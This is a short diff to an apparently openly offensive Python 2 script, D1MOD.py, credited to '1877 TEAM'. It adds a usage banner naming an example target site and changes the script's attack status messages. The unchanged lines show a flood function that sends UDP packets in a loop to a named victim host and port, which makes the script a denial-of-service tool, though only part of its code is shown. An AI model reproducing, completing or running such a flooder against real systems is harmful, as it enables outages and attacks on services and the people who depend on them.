@@ -5,11 +5,14 @@ import sys
 
 
 
-
+def usage():
+	print '---------------------------------------------------'
+	print 'USAGE: python2 D1MOD.py <url>'
+	print 'EXAMPLE : python2 D1MOD.py https://giv.tr'
+	print '1877 TEAM https://1877.team/'
+	print '---------------------------------------------------'
 
   
-
-
 def flood(victim, vport, duration):
     
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -25,7 +28,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "ATTACKING BY D1MOD1877 ✔"%(sent, victim, vport)
+        print "D1MOD1877 %s SEND %s ATTACKS %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
